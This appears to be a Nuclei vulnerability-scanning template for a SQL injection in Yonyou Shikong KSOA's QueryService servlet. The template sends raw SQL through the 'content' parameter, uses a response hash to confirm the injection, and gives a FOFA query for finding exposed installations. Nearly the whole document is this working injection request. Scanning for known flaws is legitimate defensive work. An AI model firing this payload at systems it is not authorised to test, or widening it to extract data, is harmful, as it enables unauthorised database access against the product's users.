id: poc-yaml-yongyou-ksoa-com-sksoft-bill-queryservice-sqli
info:
  name: 用友时空KSOA com.sksoft.bill.QueryService SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: 用友时空KSOA
    fofa: app="用友-时空KSOA"

variables:
  num: "{{rand_int(10000, 99999)}}"
  code: "{{md5(num)}}"

http:
  - raw:
      - |
        GET /servlet/com.sksoft.bill.QueryService?service=query&content=select%20sys.fn_varbintohexstr(hashbytes('md5','{{num}}')) HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "{{code}}"
      - type: word
        part: header
        words:
          - "text/xml"
